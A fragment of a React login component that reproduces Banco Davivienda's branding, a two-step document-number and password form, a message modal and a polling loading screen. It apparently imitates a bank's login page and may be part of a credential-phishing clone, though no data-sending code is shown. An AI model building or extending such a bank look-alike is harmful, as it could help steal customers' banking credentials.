                                                inputMode="numeric"
                                                autoComplete="off"
                                                spellCheck="false"
                                            />
                                        </div>
                                    )}

                                    <div className="davivienda-form-actions">
                                        <button type="submit" className="davivienda-btn davivienda-btn--primary">
                                            Continuar
                                        </button>
                                        <button
                                            type="button"
                                            className="davivienda-btn davivienda-btn--secondary"
                                            onClick={handleCancel}
                                        >
                                            Cancelar
                                        </button>
                                    </div>
                                </div>

                                <div className="davivienda-auth-form__errors" aria-live="polite">
                                    {authStep === 1 && documentError ? (
                                        <p className="davivienda-form-hint davivienda-form-hint--error" role="alert">
                                            {documentError}
                                        </p>
                                    ) : null}
                                    {authStep === 2 && claveError ? (
                                        <p className="davivienda-form-hint davivienda-form-hint--error" role="alert">
                                            {claveError}
                                        </p>
                                    ) : null}
                                </div>
                            </form>
                        </div>
                    </div>
                )}
            </main>

            {/* Se renderiza el footer */}
            <footer className="davivienda-footer">
                <div className="davivienda-footer__container">
                    <div className="davivienda-footer__vigilado">
                        <img
                            src={vigilado}
                            alt="Vigilado Superintendencia Financiera"
                            className="davivienda-footer__vigilado-img"
                        />
                    </div>

                    <div className="davivienda-footer__copyright">
                        Banco Davivienda S.A. Todos los derechos reservados 2026 .
                    </div>

                    <div className="davivienda-footer__brand">
                        <img
                            src={logoFooter}
                            alt="Davivienda"
                            className="davivienda-footer__logo"
                        />
                    </div>
                </div>
            </footer>

            {/* Se renderiza el modal de mensajes */}
            {showModal && (
                <div className="davivienda-modal-wrap" onClick={closeModal}>
                    <div className="davivienda-modal-card" onClick={(e) => e.stopPropagation()}>
                        <div className="davivienda-modal-top">Personas</div>
                        <div className="davivienda-modal-mid">
                            <p>{modalText}</p>
                        </div>
                        <div className="davivienda-modal-bot">
                            <button
                                type="button"
                                className="davivienda-modal-accept-btn"
                                onClick={closeModal}
                            >
                                Aceptar
                            </button>
                        </div>
                    </div>
                </div>
            )}

            {/* Se renderiza el loading mientras se procesa login o polling */}
            {getLoading && <LoadingDavivienda isOpen />}
        </div>
    );
};

// Se exporta el componente
export default LoginDaviviendaPse;